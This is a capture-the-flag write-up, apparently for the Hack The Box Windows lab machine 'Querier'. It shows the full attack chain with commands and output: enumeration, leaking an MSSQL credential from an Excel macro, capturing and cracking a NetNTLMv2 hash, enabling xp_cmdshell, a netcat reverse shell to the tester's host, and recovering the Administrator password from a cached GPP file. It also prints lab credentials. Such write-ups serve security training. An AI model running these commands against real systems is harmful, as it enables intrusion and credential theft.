`Box: Windows`
`Level: Medium`
### `Index`
1. [`Box Info`](#`Box%20Info`)
2. [`Initial Nmap Scan`](#`Initial%20Nmap%20Scan`)
3. [`RPC Enumeration`](#`RPC%20Enumeration`)
4. [`SMB Enumeration`](#`SMB%20Enumeration`)
5. [`RCE through MS-SQL`](#`RCE%20through%20MS-SQL`)
	1. [`Enable_XP_cmdshell was not Enabled`](#`Enable_XP_cmdshell%20was%20not%20Enabled`)
	2. [`Stealing NetNTLM Hash / Replay Attack using mssql`](#`Stealing%20NetNTLM%20Hash%20/%20Replay%20Attack%20using%20mssql`)
	3. [`Getting Reverse Shell MSSQL`](#`Getting%20Reverse%20Shell%20MSSQL`)
6. [`Privilege Escalation`](#`Privilege%20Escalation`)
	1. [`PowerUp.ps1 to Enumerate Windows privilege escalation vectors that rely on misconfigurations`](#`PowerUp.ps1%20to%20Enumerate%20Windows%20privilege%20escalation%20vectors%20that%20rely%20on%20misconfigurations`)
	2. [`Enabling Privileges`](#`Enabling%20Privileges`)
### `Box Info`
```
Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, PowerUp can be used to find Administrator credentials in a locally cached group policy file.
```
### `Initial Nmap Scan`
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn 10.10.10.125
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-10-27T07:01:59+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-27T06:59:01
|_Not valid after:  2054-10-27T06:59:01
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
```
Adding `QUERIER.HTB.LOCAL` into hosts file as well.
### `RPC Enumeration`
Nothing interesting but still worth looking at few outputs
```
# rpcclient -U "" 10.10.10.125                             
Password for [WORKGROUP\]:
rpcclient $> srvinfo
        10.10.10.125   Wk Sv Sql NT SNT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9007
        
rpcclient $> lsaquery
Domain Name: HTB
Domain Sid: S-1-5-21-129216161-2622397409-4045776803

rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
```
The `enumprivs` lists out good amount of `might be enabled` Privileges. Will look into that later.
### `SMB Enumeration`
```
# smbclient --no-pass -L querier.htb

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      

# smbclient //10.10.10.125/Reports                                
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir

Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

	5158399 blocks of size 4096. 826602 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (67.9 KiloBytes/sec) (average 67.9 KiloBytes/sec)
```

Opening the `xlsm` file in Hex Editor, I got the credentials for `reporting` user.
```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb]
└─# mv Currency\ Volume\ Report.xlsm Currency\ Volume\ Report.zip  

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb]
└─# unzip Currency\ Volume\ Report.zip 
Archive:  Currency Volume Report.zip
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
```

```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb/xl]
└─# hexeditor vbaProject.bin
<!----- SNIPPED ------!>
<......SELECT * FROM volume;. .0.%.B.....6.word>. .0.!.>. .@........... MsgBox "connection successful"... .6.....A1....$.D...%.F...B@H... . 
6.B@B.........k...X...o...P...............................,.Set rs = conn.Execute("SELECT * @@version;")..........X.....k.Driver={SQL Server};Server=QUERIER;Trusted_Co 
nnection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6. .0.(.:............... further testing required.
```
### `RCE through MS-SQL`

```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb/xl]
└─# impacket-mssqlclient 'QUERIER.HTB.LOCAL/reporting':'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
sh: 0: getcwd() failed: No such file or directory
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> select @@version;
 Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
        Aug 22 2017 17:04:49 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

```
SQL (QUERIER\reporting  reporting@volume)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
volume                   0   

SQL (QUERIER\reporting  reporting@volume)> select name from sys.databases;
name     
------   
master   
tempdb   
model    
msdb     
volume  
```

```
SQL (QUERIER\reporting  reporting@volume)> select * from msdb.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME                                   TABLE_TYPE   
-------------   ------------   ------------------------------------------   ----------   
msdb            dbo            syspolicy_system_health_state                b'VIEW'      
msdb            dbo            syspolicy_policy_execution_history           b'VIEW'      
msdb            dbo            syspolicy_policy_execution_history_details   b'VIEW'      
msdb            dbo            syspolicy_configuration                      b'VIEW'      
msdb            dbo            syspolicy_conditions                         b'VIEW'      
msdb            dbo            syspolicy_policy_categories                  b'VIEW'      
msdb            dbo            sysdac_instances                             b'VIEW'      
msdb            dbo            syspolicy_object_sets                        b'VIEW'      
msdb            dbo            dm_hadr_automatic_seeding_history            b'BASE TABLE'   
msdb            dbo            syspolicy_policies                           b'VIEW'      
msdb            dbo            backupmediaset                               b'BASE TABLE'   
msdb            dbo            backupmediafamily                            b'BASE TABLE'   
msdb            dbo            backupset                                    b'BASE TABLE'   
msdb            dbo            autoadmin_backup_configuration_summary       b'VIEW'     
msdb            dbo            backupfile                                   b'BASE TABLE'   
msdb            dbo            syspolicy_target_sets                        b'VIEW'      
msdb            dbo            restorehistory                               b'BASE TABLE'   
msdb            dbo            restorefile                                  b'BASE TABLE'   
msdb            dbo            syspolicy_target_set_levels                  b'VIEW'      
msdb            dbo            restorefilegroup                             b'BASE TABLE'   
msdb            dbo            logmarkhistory                               b'BASE TABLE'   
msdb            dbo            suspect_pages                                b'BASE TABLE'   
msdb            dbo            syspolicy_policy_category_subscriptions      b'VIEW'
```

###### `Enable_XP_cmdshell was not Enabled`
```
SQL (QUERIER\reporting  reporting@volume)> enable_xp_cmdshell
ERROR(QUERIER): Line 105: User does not have permission to perform this action.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement
```

###### `Stealing NetNTLM Hash / Replay Attack using mssql`
Login using `reporting` User
```
──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb/xl]
└─# impacket-mssqlclient 'QUERIER.HTB.LOCAL/reporting':'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
sh: 0: getcwd() failed: No such file or directory
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Start the SMB Server
```

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb]
└─# impacket-smbserver a . -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
10/28/2024 01:38:10 AM: INFO: Config file parsed
```

Stealing NetNTLM Hash
```
SQL (QUERIER\reporting  reporting@volume)> exec master.dbo.xp_dirtree "\\10.10.14.2\a"
subdirectory   depth   
------------   -----   

```

On the SMB Server Side
```
10/28/2024 01:39:15 AM: INFO: Incoming connection (10.10.10.125,49675)
10/28/2024 01:39:15 AM: INFO: AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
10/28/2024 01:39:15 AM: INFO: User QUERIER\mssql-svc authenticated successfully
10/28/2024 01:39:15 AM: INFO: mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:e3492650db117eca8013dfbf515ad7b6:0101000000000000800367b9fb28db0105fc4c6c09d0c40b000000000100100075005800750059004f0069004b0068000300100075005800750059004f0069004b006800020010006e00430054006100570070006d004c00040010006e00430054006100570070006d004c0007000800800367b9fb28db0106000400020000000800300030000000000000000000000000300000fbd3972a7625b314d60bd20e3e3457d4251db2d7b6479cd835a0e6ece05d16670a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
10/28/2024 01:39:15 AM: INFO: Connecting Share(1:IPC$)
10/28/2024 01:39:15 AM: INFO: Connecting Share(2:a)
10/28/2024 01:39:15 AM: INFO: AUTHENTICATE_MESSAGE (\,QUERIER)
10/28/2024 01:39:15 AM: INFO: User QUERIER\ authenticated successfully
```

Cracking the NetNTLMv2 Hash
```
# hashcat -m 5600 -a 0 NTLM_mssql /usr/share/wordlists/rockyou.txt
MSSQL-SVC::QUERIER:aaaaaaaaaaaaaaaa:e3492650db117eca8013dfbf515ad7b6:0101000000000000800367b9fb28db0105fc4c6c09d0c40b000000000100100075005800750059004f0069004b0068000300100075005800750059004f0069004b006800020010006e00430054006100570070006d004c00040010006e00430054006100570070006d004c0007000800800367b9fb28db0106000400020000000800300030000000000000000000000000300000fbd3972a7625b314d60bd20e3e3457d4251db2d7b6479cd835a0e6ece05d16670a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000:corporate568
```

Login to MY SQL using the `mssql-svc` user credentials
```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb/xl]
└─# impacket-mssqlclient 'QUERIER.HTB.LOCAL/mssql-svc':'corporate568'@10.10.10.125 -windows-auth
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

<!---- Successfully Enabled The xp_cmdshell ---->
```
For some reason I had to run the `enable_xp_cmdshell` command twice to run the SYSTEM commands
```
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami /priv
--------------------------------------------------------------------------------   
PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

###### `Getting Reverse Shell MSSQL`
```
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "xcopy \\10.10.14.2\a\nc64.exe C:\temp\"
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "C:\temp\nc64.exe 10.10.14.2 4444 -e cmd.exe"
```

On the NetCat Side
```
──(root㉿kali)-[/home/ringbuffer/Downloads/Querier.htb]
└─# nc -lvnp 4444                                                                                                                                        
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.125] 49679
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
```

The `Powershell -e <Base64>` was not working because the Anti-Virus Keeps blocking it.
### `Privilege Escalation`
###### `PowerUp.ps1 to Enumerate Windows privilege escalation vectors that rely on misconfigurations`
```
PS C:\temp> xcopy \\10.10.14.2\a\PowerUp.ps1 .
xcopy \\10.10.14.2\a\PowerUp.ps1 .
\\10.10.14.2\a\PowerUp.ps1
1 File(s) copied

PS C:\temp> Import-Module .\PowerUp.ps1
Import-Module .\PowerUp.ps1
PS C:\temp> Invoke-AllChecks
Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2468
ProcessId   : 1544
Name        : 1544
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Although We got the password above but I wanted to crack the Group.xml. The password for Administrator is `MyUnclesAreMarioAndLuigi!!1!`.
```
PS C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups> copy Groups.xml C:\temp\
PS C:\temp> copy Groups.xml \\10.10.14.2\a\

# impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Found a Groups XML file:
[*]   file      : Groups.xml
[*]   newName   : 
[*]   userName  : Administrator
[*]   password  : MyUnclesAreMarioAndLuigi!!1!
[*]   changed   : 2019-01-28 23:12:48

```

```
# evil-winrm -i 10.10.10.125 -u 'administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'
 
Evil-WinRM shell v3.5
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
t*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c96d058c******************************
```


```
C:\Users\Default>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

###### `Enabling Privileges`
```
C:\temp>xcopy \\10.10.14.2\a\EnableAllTokenPrivs.ps1 .
xcopy \\10.10.14.2\a\EnableAllTokenPrivs.ps1 .
\\10.10.14.2\a\EnableAllTokenPrivs.ps1
1 File(s) copied
```

```
PS C:\temp> Import-Module .\EnableAllTokenPrivs.ps1
Import-Module .\EnableAllTokenPrivs.ps1
PS C:\temp> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

Now you can take advantage of Potato Exploits.